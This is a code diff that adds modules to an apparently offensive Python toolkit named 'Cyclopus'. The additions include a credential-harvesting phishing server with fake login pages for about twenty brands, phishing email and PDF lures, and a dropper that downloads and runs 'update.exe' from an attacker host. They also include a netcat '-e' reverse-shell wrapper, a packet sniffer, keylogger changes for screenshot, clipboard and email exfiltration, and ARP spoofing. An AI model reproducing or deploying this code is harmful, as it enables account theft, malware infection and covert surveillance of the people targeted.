+    def stop_heartbeat(self):
+        if self.heartbeat_timer:
+            self.heartbeat_timer.cancel()
+            self.heartbeat_timer = None
+    
+    def get_agents(self) -> List[Dict]:
+        return self.db.get_agents()
+    
+    def get_agent(self, agent_id: str) -> Optional[Dict]:
+        return self.db.get_agent(agent_id)
+
+# =====================
+# NETWORK MONITOR
+# =====================
+class NetworkMonitor:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+        self.running = False
+        self.packet_count = 0
+        self.interface = config.get('network_monitor.interface', 'eth0')
+        self.promiscuous = config.get('network_monitor.promiscuous', False)
+        self.capture_limit = config.get('network_monitor.packet_capture_limit', 1000)
+    
+    def start(self):
+        self.running = True
+        threading.Thread(target=self._monitor_loop, daemon=True).start()
+        print(f"{Colors.SUCCESS}✅ Network monitor started on {self.interface}{Colors.RESET}")
+    
+    def stop(self):
+        self.running = False
+    
+    def _monitor_loop(self):
+        while self.running:
+            try:
+                if SCAPY_AVAILABLE:
+                    self._scapy_monitor()
+                else:
+                    self._socket_monitor()
+            except Exception as e:
+                logger.error(f"Network monitor error: {e}")
+                time.sleep(5)
+    
+    def _scapy_monitor(self):
+        from scapy.all import sniff
+        sniff(iface=self.interface, prn=self._process_packet, store=0,
+              promisc=self.promiscuous, count=self.capture_limit)
+    
+    def _socket_monitor(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
+        sock.bind((self.interface, 0))
+        sock.settimeout(1)
+        
+        while self.running:
+            try:
+                data, addr = sock.recvfrom(65535)
+                self._process_packet(data)
+            except socket.timeout:
+                continue
+            except Exception as e:
+                logger.error(f"Socket monitor error: {e}")
+                break
+        
+        sock.close()
+    
+    def _process_packet(self, packet):
+        self.packet_count += 1
+        
+        try:
+            if SCAPY_AVAILABLE and hasattr(packet, 'haslayer'):
+                if packet.haslayer(IP):
+                    ip = packet[IP]
+                    src_ip = ip.src
+                    dst_ip = ip.dst
+                    protocol = ip.proto
+                    size = len(packet)
+                    
+                    src_port = 0
+                    dst_port = 0
+                    payload = ""
+                    
+                    if packet.haslayer(TCP):
+                        src_port = packet[TCP].sport
+                        dst_port = packet[TCP].dport
+                        protocol = "TCP"
+                    elif packet.haslayer(UDP):
+                        src_port = packet[UDP].sport
+                        dst_port = packet[UDP].dport
+                        protocol = "UDP"
+                    elif packet.haslayer(ICMP):
+                        protocol = "ICMP"
+                    
+                    self.db.save_network_packet(src_ip, dst_ip, src_port, dst_port, protocol, size, str(packet))
+            else:
+                self.db.save_network_packet("unknown", "unknown", 0, 0, "unknown", len(packet), "")
+        except Exception as e:
+            logger.error(f"Packet processing error: {e}")
+    
+    def get_packets(self, limit: int = 100) -> List[Dict]:
+        return self.db.get_network_packets(limit)
+    
+    def get_statistics(self) -> Dict:
+        packets = self.db.get_network_packets(1000)
+        stats = {
+            'total_packets': len(packets),
+            'protocols': Counter(),
+            'top_sources': Counter(),
+            'top_dests': Counter()
+        }
+        
+        for p in packets:
+            stats['protocols'][p.get('protocol', 'unknown')] += 1
+            stats['top_sources'][p.get('source_ip', 'unknown')] += 1
+            stats['top_dests'][p.get('dest_ip', 'unknown')] += 1
+        
+        return stats
+
+# =====================
+# PHISHING SERVER
+# =====================
+class PhishingRequestHandler(BaseHTTPRequestHandler):
+    server_instance = None
+    
+    def log_message(self, format, *args):
+        pass
+    
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/html')
+        self.end_headers()
+        
+        if self.server_instance and self.server_instance.html_content:
+            self.wfile.write(self.server_instance.html_content.encode())
+        
+        if self.server_instance and self.server_instance.db and self.server_instance.link_id:
+            self.server_instance.db.conn.execute(
+                "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
+                (self.server_instance.link_id,)
+            )
+            self.server_instance.db.conn.commit()
+    
+    def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length).decode()
+        form_data = urllib.parse.parse_qs(post_data)
+        
+        username = form_data.get('email', form_data.get('username', ['']))[0]
+        password = form_data.get('password', [''])[0]
+        client_ip = self.client_address[0]
+        user_agent = self.headers.get('User-Agent', 'Unknown')
+        
+        if self.server_instance and self.server_instance.db and username and password:
+            self.server_instance.db.save_captured_credential(
+                self.server_instance.link_id, username, password, client_ip, user_agent
+            )
+            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
+            print(f"  IP: {client_ip}")
+            print(f"  Username: {username}")
+            print(f"  Password: {password}")
+        
+        self.send_response(302)
+        self.send_header('Location', 'https://www.google.com')
+        self.end_headers()
+
+class PhishingServer:
+    def __init__(self, db: DatabaseManager):
+        self.db = db
+        self.server = None
+        self.running = False
+        self.link_id = None
+        self.html_content = None
+    
+    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
+        try:
+            self.link_id = link_id
+            self.html_content = html_content
+            
+            handler = PhishingRequestHandler
+            handler.server_instance = self
+            
+            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
+            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+            thread.start()
+            self.running = True
+            return True
+        except:
+            return False
+    
+    def stop(self):
+        if self.server:
+            self.server.shutdown()
+            self.server.server_close()
+            self.running = False
+    
+    def get_url(self) -> str:
+        return f"http://{self._get_local_ip()}:8080"
+    
+    def _get_local_ip(self) -> str:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
+
+# =====================
+# SOCIAL ENGINEERING TOOLS
+# =====================
+class SocialEngineeringTools:
+    def __init__(self, db: DatabaseManager):
+        self.db = db
+        self.phishing_server = PhishingServer(db)
+        self.active_links = {}
+    
+    def generate_phishing_link(self, platform: str) -> Dict:
+        link_id = str(uuid.uuid4())[:8]
+        
+        templates = {
+            'facebook': self._get_template("facebook", "#1877f2", "Facebook"),
+            'instagram': self._get_template("instagram", "#0095f6", "Instagram"),
+            'twitter': self._get_template("twitter", "#1d9bf0", "X / Twitter"),
+            'gmail': self._get_template("gmail", "#1a73e8", "Gmail"),
+            'linkedin': self._get_template("linkedin", "#0a66c2", "LinkedIn"),
+            'microsoft': self._get_template("microsoft", "#0078d4", "Microsoft"),
+            'google': self._get_template("google", "#4285f4", "Google"),
+            'apple': self._get_template("apple", "#0071e3", "Apple"),
+            'paypal': self._get_template("paypal", "#0070ba", "PayPal"),
+            'amazon': self._get_template("amazon", "#ff9900", "Amazon"),
+            'netflix': self._get_template("netflix", "#e50914", "NETFLIX"),
+            'spotify': self._get_template("spotify", "#1ed760", "Spotify"),
+            'whatsapp': self._get_template("whatsapp", "#25d366", "WhatsApp"),
+            'telegram': self._get_template("telegram", "#2aabee", "Telegram"),
+            'discord': self._get_template("discord", "#5865f2", "Discord"),
+            'github': self._get_template("github", "#24292f", "GitHub"),
+            'slack': self._get_template("slack", "#611f69", "Slack"),
+            'office365': self._get_template("office365", "#0078d4", "Office 365"),
+            'icloud': self._get_template("icloud", "#0071e3", "iCloud"),
+            'steam': self._get_template("steam", "#67c1f5", "Steam"),
+        }
+        
+        html = templates.get(platform, self._custom_template())
+        
+        link = PhishingLink(
+            id=link_id,
+            platform=platform,
+            phishing_url=f"http://localhost:8080",
+            template=platform,
+            created_at=datetime.datetime.now().isoformat()
+        )
+        
+        self.db.save_phishing_link(link)
+        self.active_links[link_id] = {'platform': platform, 'html': html}
+        
+        return {'success': True, 'link_id': link_id, 'platform': platform}
+    
+    def start_server(self, link_id: str, port: int = 8080) -> bool:
+        if link_id not in self.active_links:
+            return False
+        link_data = self.active_links[link_id]
+        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
+    
+    def stop_server(self):
+        self.phishing_server.stop()
+    
+    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
+        return self.db.get_captured_credentials(link_id)
+    
+    def _get_template(self, name: str, color: str, display_name: str) -> str:
+        return f"""<!DOCTYPE html>
+<html><head><title>{display_name}</title>
+<style>
+body{{font-family:Arial;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
+.login-box{{background:#1a1a1a;border:1px solid #ff7a1a;border-radius:8px;padding:20px;width:400px;box-shadow:0 0 30px rgba(255,122,26,0.1)}}
+.logo{{color:{color};font-size:32px;text-align:center;margin-bottom:20px}}
+input{{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:1px solid #333;border-radius:6px;box-sizing:border-box;color:#fff}}
+input:focus{{outline:none;border-color:#ff7a1a}}
+button{{width:100%;padding:14px;background:{color};color:white;border:none;border-radius:6px;font-size:20px;cursor:pointer}}
+.warning{{margin-top:20px;padding:10px;background:rgba(255,0,0,0.1);color:#ff6b6b;text-align:center;border-radius:4px;font-size:12px}}
+</style>
+</head>
+<body>
+<div class="login-box"><div class="logo">{display_name}</div>
+<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Log In</button></form>
+<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
+</div>
+</body>
+</html>"""
+    
+    def _custom_template(self):
+        return """<!DOCTYPE html>
+<html><head><title>Secure Login</title>
+<style>
+body{font-family:Arial;background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+.login-box{background:#1a1a1a;border:1px solid #ff7a1a;border-radius:8px;padding:40px;width:400px;box-shadow:0 0 30px rgba(255,122,26,0.1)}
+.logo{text-align:center;margin-bottom:30px;color:#ff7a1a;font-size:28px;font-weight:bold}
+input{width:100%;padding:14px;margin:10px 0;background:#0a0a0a;border:1px solid #333;border-radius:6px;color:#fff;box-sizing:border-box}
+input:focus{outline:none;border-color:#ff7a1a}
+button{width:100%;padding:14px;background:#ff7a1a;color:white;border:none;border-radius:6px;cursor:pointer;font-weight:bold;font-size:16px;transition:all 0.3s}
+button:hover{background:#e8600a;box-shadow:0 0 30px rgba(255,122,26,0.2)}
+.warning{margin-top:20px;padding:10px;background:rgba(255,0,0,0.1);border-radius:6px;color:#ff6b6b;text-align:center;font-size:12px}
+</style>
+</head>
+<body>
+<div class="login-box"><div class="logo">🐙 CYCLOPUS</div>
+<form method="POST"><input type="text" name="username" placeholder="Username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Secure Login</button></form>
+<div class="warning">🔒 Secure connection - Do not enter real credentials</div>
+</div>
+</body>
+</html>"""
+
+# =====================
+# NETWORK TOOLS
+# =====================
+class NetworkTools:
+    @staticmethod
+    def ping(target: str, count: int = 4) -> CommandResult:
+        start_time = time.time()
+        try:
+            if platform.system().lower() == 'windows':
+                cmd = ['ping', '-n', str(count), target]
+            else:
+                cmd = ['ping', '-c', str(count), target]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            execution_time = time.time() - start_time
+            
+            return CommandResult(
+                success=result.returncode == 0,
+                output=result.stdout + result.stderr,
+                execution_time=execution_time
+            )
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
+        start_time = time.time()
+        try:
+            if scan_type == "quick":
+                cmd = ['nmap', '-T4', '-F', target]
+            elif scan_type == "full":
+                cmd = ['nmap', '-p-', target]
+            elif scan_type == "service":
+                cmd = ['nmap', '-sV', target]
+            elif scan_type == "os":
+                cmd = ['nmap', '-O', target]
+            else:
+                cmd = ['nmap', target]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+            execution_time = time.time() - start_time
+            
+            return CommandResult(
+                success=result.returncode == 0,
+                output=result.stdout + result.stderr,
+                execution_time=execution_time
+            )
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def wget(url: str, output: str = None) -> CommandResult:
+        start_time = time.time()
+        try:
+            cmd = ['wget', '-q', url]
+            if output:
+                cmd.extend(['-O', output])
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            execution_time = time.time() - start_time
+            
+            return CommandResult(
+                success=result.returncode == 0,
+                output=result.stdout + result.stderr,
+                execution_time=execution_time
+            )
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
+        start_time = time.time()
+        try:
+            if method.upper() == "GET":
+                cmd = ['curl', '-s', url]
+            elif method.upper() == "POST":
+                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
+            else:
+                cmd = ['curl', '-s', '-X', method, url]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+            execution_time = time.time() - start_time
+            
+            return CommandResult(
+                success=result.returncode == 0,
+                output=result.stdout + result.stderr,
+                execution_time=execution_time
+            )
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def netcat(host: str, port: int, command: str = None) -> CommandResult:
+        start_time = time.time()
+        try:
+            if shutil.which('nc'):
+                if command:
+                    cmd = ['nc', host, str(port), '-e', command]
+                else:
+                    cmd = ['nc', '-zv', host, str(port)]
+            elif shutil.which('ncat'):
+                if command:
+                    cmd = ['ncat', host, str(port), '-e', command]
+                else:
+                    cmd = ['ncat', '-zv', host, str(port)]
+            else:
+                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            execution_time = time.time() - start_time
+            
+            return CommandResult(
+                success=result.returncode == 0,
+                output=result.stdout + result.stderr,
+                execution_time=execution_time
+            )
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def traceroute(target: str) -> CommandResult:
+        start_time = time.time()
+        try:
+            if platform.system().lower() == 'windows':
+                cmd = ['tracert', '-d', target]
+            else:
+                if shutil.which('mtr'):
+                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
+                else:
+                    cmd = ['traceroute', '-n', target]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+            execution_time = time.time() - start_time
+            
+            return CommandResult(
+                success=result.returncode == 0,
+                output=result.stdout + result.stderr,
+                execution_time=execution_time
+            )
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def whois(domain: str) -> CommandResult:
+        start_time = time.time()
+        try:
+            if WHOIS_AVAILABLE:
+                result = whois.whois(domain)
+                execution_time = time.time() - start_time
+                return CommandResult(True, str(result), execution_time)
+            else:
+                cmd = ['whois', domain]
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+                execution_time = time.time() - start_time
+                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def dns(domain: str, record_type: str = "A") -> CommandResult:
+        start_time = time.time()
+        try:
+            if shutil.which('dig'):
+                cmd = ['dig', domain, record_type, '+short']
+            else:
+                cmd = ['nslookup', domain]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            execution_time = time.time() - start_time
+            
+            return CommandResult(
+                success=result.returncode == 0,
+                output=result.stdout + result.stderr,
+                execution_time=execution_time
+            )
+        except Exception as e:
+            return CommandResult(False, str(e), time.time() - start_time, str(e))
+    
+    @staticmethod
+    def location(ip: str) -> Dict:
+        try:
+            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
+            if response.status_code == 200:
+                data = response.json()
+                if data.get('status') == 'success':
+                    return {
+                        'success': True,
+                        'country': data.get('country'),
+                        'city': data.get('city'),
+                        'isp': data.get('isp'),
+                        'lat': data.get('lat'),
+                        'lon': data.get('lon')
+                    }
+            return {'success': False}
+        except:
+            return {'success': False}
+    
+    @staticmethod
+    def get_local_ip() -> str:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
+        except:
+            return "127.0.0.1"
+    
+    @staticmethod
+    def block_ip(ip: str) -> bool:
+        try:
+            if platform.system().lower() == 'linux' and shutil.which('iptables'):
+                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
+                             capture_output=True, timeout=10)
+                return True
+            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
+                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                               f'name=Cyclopus_Block_{ip}', 'dir=in', 'action=block',
+                               f'remoteip={ip}'], capture_output=True, timeout=10)
+                return True
+            return False
+        except:
+            return False
+    
+    @staticmethod
+    def unblock_ip(ip: str) -> bool:
+        try:
+            if platform.system().lower() == 'linux' and shutil.which('iptables'):
+                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
+                             capture_output=True, timeout=10)
+                return True
+            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
+                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
+                               f'name=Cyclopus_Block_{ip}'], capture_output=True, timeout=10)
+                return True
+            return False
+        except:
+            return False
+    
+    @staticmethod
+    def ip_to_domain(ip: str) -> Optional[str]:
+        try:
+            try:
+                domain = socket.gethostbyaddr(ip)[0]
+                if domain:
+                    return domain
+            except:
+                pass
+            
+            if DNS_AVAILABLE:
+                try:
+                    import dns.reversename
+                    import dns.resolver
+                    rev_name = dns.reversename.from_address(ip)
+                    answers = dns.resolver.resolve(rev_name, "PTR")
+                    if answers:
+                        return str(answers[0]).rstrip('.')
+                except:
+                    pass
+            
+            return None
+        except Exception as e:
+            logger.error(f"IP to domain error: {e}")
+            return None
+    
+    @staticmethod
+    def domain_to_ip(domain: str) -> Optional[str]:
+        try:
+            try:
+                ip = socket.gethostbyname(domain)
+                if ip:
+                    return ip
+            except:
+                pass
+            
+            if DNS_AVAILABLE:
+                try:
+                    import dns.resolver
+                    answers = dns.resolver.resolve(domain, "A")
+                    if answers:
+                        return str(answers[0])
+                except:
+                    pass
+            
+            return None
+        except Exception as e:
+            logger.error(f"Domain to IP error: {e}")
+            return None
+    
+    @staticmethod
+    def get_mac_vendor(mac: str) -> Optional[str]:
+        try:
+            mac = mac.upper().replace('-', ':').replace('.', ':')
+            prefix = mac[:8].replace(':', '')
+            
+            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
+            if response.status_code == 200:
+                return response.text.strip()
+        except:
+            pass
+        return None
+
+# =====================
+# DOMAIN HOSTING ENGINE
+# =====================
+class DomainHostingEngine:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+        self.hosted_domains = {}
+        self.domain_to_ip = {}
+    
+    def translate_ip_to_domain(self, ip: str) -> Optional[str]:
+        try:
+            domain = self.db.resolve_ip(ip)
+            if domain:
+                return domain
+            
+            try:
+                if DNS_AVAILABLE:
+                    import dns.reversename
+                    import dns.resolver
+                    rev_name = dns.reversename.from_address(ip)
+                    answers = dns.resolver.resolve(rev_name, "PTR")
+                    if answers:
+                        domain = str(answers[0]).rstrip('.')
+                        return domain
+            except:
+                pass
+            
+            try:
+                domain = socket.gethostbyaddr(ip)[0]
+                if domain:
+                    return domain
+            except:
+                pass
+            
+            return None
+        except Exception as e:
+            logger.error(f"IP to domain translation error: {e}")
+            return None
+    
+    def translate_domain_to_ip(self, domain: str) -> Optional[str]:
+        try:
+            ip = self.db.resolve_domain(domain)
+            if ip:
+                return ip
+            
+            try:
+                if DNS_AVAILABLE:
+                    import dns.resolver
+                    answers = dns.resolver.resolve(domain, "A")
+                    if answers:
+                        ip = str(answers[0])
+                        return ip
+            except:
+                pass
+            
+            try:
+                ip = socket.gethostbyname(domain)
+                if ip:
+                    return ip
+            except:
+                pass
+            
+            return None
+        except Exception as e:
+            logger.error(f"Domain to IP translation error: {e}")
+            return None
+    
+    def host_domain(self, ip: str, domain: str, port: int = 8080) -> DomainHost:
+        try:
+            ipaddress.ip_address(ip)
+            
+            host_id = str(uuid.uuid4())[:8]
+            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
+            os.makedirs(hosting_path, exist_ok=True)
+            
+            domain_host = DomainHost(
+                id=host_id,
+                ip=ip,
+                domain=domain,
+                hosting_path=hosting_path,
+                created_at=datetime.datetime.now().isoformat(),
+                active=True
+            )
+            
+            self.db.add_domain_host(domain_host)
+            
+            self.hosted_domains[domain] = {
+                'ip': ip,
+                'port': port,
+                'path': hosting_path,
+                'id': host_id
+            }
+            self.domain_to_ip[domain] = ip
+            
+            logger.info(f"Domain {domain} hosted on IP {ip}:{port}")
+            return domain_host
+        except Exception as e:
+            logger.error(f"Domain hosting error: {e}")
+            return None
+    
+    def host_website(self, domain: str, html_content: str) -> bool:
+        try:
+            if domain not in self.hosted_domains:
+                return False
+            
+            domain_info = self.hosted_domains[domain]
+            index_path = os.path.join(domain_info['path'], 'index.html')
+            
+            with open(index_path, 'w') as f:
+                f.write(html_content)
+            
+            port = domain_info['port']
+            threading.Thread(target=self._start_http_server, args=(domain_info['path'], port), daemon=True).start()
+            
+            logger.info(f"Website hosted on http://{domain}:{port}")
+            return True
+        except Exception as e:
+            logger.error(f"Website hosting error: {e}")
+            return False
+    
+    def _start_http_server(self, path: str, port: int):
+        try:
+            os.chdir(path)
+            handler = http.server.SimpleHTTPRequestHandler
+            with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
+                logger.info(f"Serving domain on port {port}")
+                httpd.serve_forever()
+        except Exception as e:
+            logger.error(f"HTTP server error: {e}")
+    
+    def list_hosted_domains(self) -> List[Dict]:
+        try:
+            return self.db.get_domain_hosts()
+        except Exception as e:
+            logger.error(f"List domains error: {e}")
+            return []
+    
+    def get_domain_ips(self) -> Dict[str, str]:
+        try:
+            rows = self.db.get_domain_hosts()
+            return {row['domain']: row['ip'] for row in rows if row['active']}
+        except Exception as e:
+            logger.error(f"Get domain IPs error: {e}")
+            return {}
+
+# =====================
+# DEPLOYMENT ENGINE
+# =====================
+class DeploymentEngine:
+    def __init__(self, db: DatabaseManager, config: ConfigManager):
+        self.db = db
+        self.config = config
+    
+    def create_pdf_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
+        deployment_id = str(uuid.uuid4())[:8]
+        
+        pdf_content = f"""
+        %PDF-1.4
+        1 0 obj
+        << /Type /Catalog /Pages 2 0 R >>
+        endobj
+        2 0 obj
+        << /Type /Pages /Kids [3 0 R] /Count 1 >>
+        endobj
+        3 0 obj
+        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
+        endobj
+        4 0 obj
+        << /Length 200 >>
+        stream
+        BT
+        /F1 24 Tf
+        100 700 Td
+        (Important Document) Tj
+        /F1 12 Tf
+        100 650 Td
+        (Please click here to view: {keylog_url}) Tj
+        ET
+        endstream
+        endobj
+        xref
+        0 5
+        0000000000 65535 f
+        0000000009 00000 n
+        0000000054 00000 n
+        0000000102 00000 n
+        0000000200 00000 n
+        trailer
+        << /Size 5 /Root 1 0 R >>
+        startxref
+        300
+        %%EOF
+        """
+        
+        pdf_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.pdf")
+        with open(pdf_path, 'w') as f:
+            f.write(pdf_content)
+        
+        deployment = Deployment(
+            id=deployment_id,
+            name=name,
+            type="pdf",
+            payload=pdf_path,
+            target=target,
+            created_at=datetime.datetime.now().isoformat()
+        )
+        
+        self.db.save_deployment(deployment)
+        return deployment
+    
+    def create_email_payload(self, name: str, target: str, subject: str, body: str, keylog_url: str) -> Deployment:
+        deployment_id = str(uuid.uuid4())[:8]
+        
+        email_content = f"""
+        Subject: {subject}
+        From: security@{self.config.get('spear_phishing.smtp_username', '').split('@')[-1] or 'example.com'}
+        To: {target}
+        Content-Type: text/html
+        
+        <html>
+        <body>
+        {body}
+        <br><br>
+        <a href="{keylog_url}">Click here to view the document</a>
+        <br><br>
+        <img src="{keylog_url}/tracking.gif" width="1" height="1">
+        </body>
+        </html>
+        """
+        
+        email_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.eml")
+        with open(email_path, 'w') as f:
+            f.write(email_content)
+        
+        deployment = Deployment(
+            id=deployment_id,
+            name=name,
+            type="email",
+            payload=email_path,
+            target=target,
+            created_at=datetime.datetime.now().isoformat()
+        )
+        
+        self.db.save_deployment(deployment)
+        return deployment
+    
+    def create_link_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
+        deployment_id = str(uuid.uuid4())[:8]
+        
+        if SHORTENER_AVAILABLE:
+            try:
+                s = pyshorteners.Shortener()
+                keylog_url = s.tinyurl.short(keylog_url)
+            except:
+                pass
+        
+        deployment = Deployment(
+            id=deployment_id,
+            name=name,
+            type="link",
+            payload=keylog_url,
+            target=target,
+            created_at=datetime.datetime.now().isoformat()
+        )
+        
+        self.db.save_deployment(deployment)
+        return deployment
+    
+    def create_executable_payload(self, name: str, target: str, keylog_server: str) -> Deployment:
+        deployment_id = str(uuid.uuid4())[:8]
+        
+        exe_content = f'''
+import os
+import sys
+import subprocess
+import requests
+import platform
+import base64
+
+def download_and_execute(url):
+    try:
+        response = requests.get(url, timeout=30)
+        if response.status_code == 200:
+            temp_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'update.exe')
+            with open(temp_path, 'wb') as f:
+                f.write(response.content)
+            os.chmod(temp_path, 0o755)
+            subprocess.Popen([temp_path], shell=True)
+    except:
+        pass
+
+if __name__ == "__main__":
+    download_and_execute("{keylog_server}/download")
+'''
+        
+        exe_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.py")
+        with open(exe_path, 'w') as f:
+            f.write(exe_content)
+        
+        deployment = Deployment(
+            id=deployment_id,
+            name=name,
+            type="executable",
+            payload=exe_path,
+            target=target,
+            created_at=datetime.datetime.now().isoformat()
+        )
+        
+        self.db.save_deployment(deployment)
+        return deployment
+    
+    def get_deployments(self) -> List[Dict]:
+        return self.db.get_deployments()
+    
+    def track_opened(self, deployment_id: str):
+        self.db.update_deployment_status(deployment_id, opened=True)
+        logger.info(f"Deployment {deployment_id} opened")
+    
+    def track_executed(self, deployment_id: str):
+        self.db.update_deployment_status(deployment_id, executed=True)
+        logger.info(f"Deployment {deployment_id} executed")
+
+# =====================
 # KEYLOGGER ENGINE
 # =====================
 class KeyloggerEngine:
@@ -2131,6 +4097,7 @@ class KeyloggerEngine:
             print(f"{Colors.SECONDARY}  • Press {self.config.get('keylogger.hotkey', 'F10')} to stop{Colors.RESET}")
             print(f"{Colors.SECONDARY}  • Screenshot interval: {self.screenshot_interval}s{Colors.RESET}")
             print(f"{Colors.SECONDARY}  • Upload interval: {self.upload_interval}s{Colors.RESET}")
+            print(f"{Colors.SECONDARY}  • Clipboard capture: {'Enabled' if self.capture_clipboard else 'Disabled'}{Colors.RESET}")
             return True
         except Exception as e:
             print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
@@ -2209,7 +4176,7 @@ class KeyloggerEngine:
         try:
             import pyautogui
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            screenshot_path = os.path.join(REPORT_DIR, f"screenshot_{timestamp}.png")
+            screenshot_path = os.path.join(KEYLOG_EXFIL_DIR, f"screenshot_{timestamp}.png")
             screenshot = pyautogui.screenshot()
             screenshot.save(screenshot_path)
             logger.info(f"Screenshot saved: {screenshot_path}")
@@ -2256,7 +4223,7 @@ class KeyloggerEngine:
     def _exfil_file(self, text: str, screenshot_path: str):
         try:
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = os.path.join(REPORT_DIR, f"exfil_{timestamp}.txt")
+            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
             with open(filename, 'w') as f:
                 f.write(f"[{timestamp}]\n{text}\n")
                 if screenshot_path:
@@ -2267,10 +4234,10 @@ class KeyloggerEngine:
     
     def _exfil_email(self, text: str, screenshot_path: str):
         try:
-            smtp_server = self.config.get('email.smtp_server', '')
-            smtp_port = self.config.get('email.smtp_port', 587)
-            smtp_username = self.config.get('email.smtp_username', '')
-            smtp_password = self.config.get('email.smtp_password', '')
+            smtp_server = self.config.get('spear_phishing.smtp_server', '')
+            smtp_port = self.config.get('spear_phishing.smtp_port', 587)
+            smtp_username = self.config.get('spear_phishing.smtp_username', '')
+            smtp_password = self.config.get('spear_phishing.smtp_password', '')
             to_email = self.config.get('keylogger.email_recipient', '')
             
             if not all([smtp_server, smtp_username, smtp_password, to_email]):
@@ -2358,7 +4325,7 @@ class KeyloggerEngine:
     
     def get_screenshots(self) -> List[str]:
         try:
-            return [f for f in os.listdir(REPORT_DIR) if f.startswith('screenshot_')]
+            return [f for f in os.listdir(KEYLOG_EXFIL_DIR) if f.startswith('screenshot_')]
         except:
             return []
     
@@ -2379,6 +4346,7 @@ class ARPSpoofingEngine:
         self.active_spoofs = {}
         self.interface = config.get('arp_spoofing.interface', 'eth0')
         self.enable_ip_forward = config.get('arp_spoofing.enable_ip_forward', True)
+        self.sniff_interval = config.get('arp_spoofing.sniff_interval', 60)
         self.stop_events = {}
     
     def start_spoof(self, target_ip: str, gateway_ip: str, interface: str = None) -> ARPSpoofResult:
@@ -2553,11 +4521,25 @@ class MACManager:
     def __init__(self, db: DatabaseManager):
         self.db = db
         self.vendor_cache = {}
+        self._load_vendor_cache()
+    
+    def _load_vendor_cache(self):
+        try:
+            vendor_file = os.path.join(CONFIG_DIR, "mac_vendors.json")
+            if os.path.exists(vendor_file):
+                with open(vendor_file, 'r') as f:
+                    self.vendor_cache = json.load(f)
+        except:
+            pass
     
     def get_mac_info(self, mac_address: str) -> Dict:
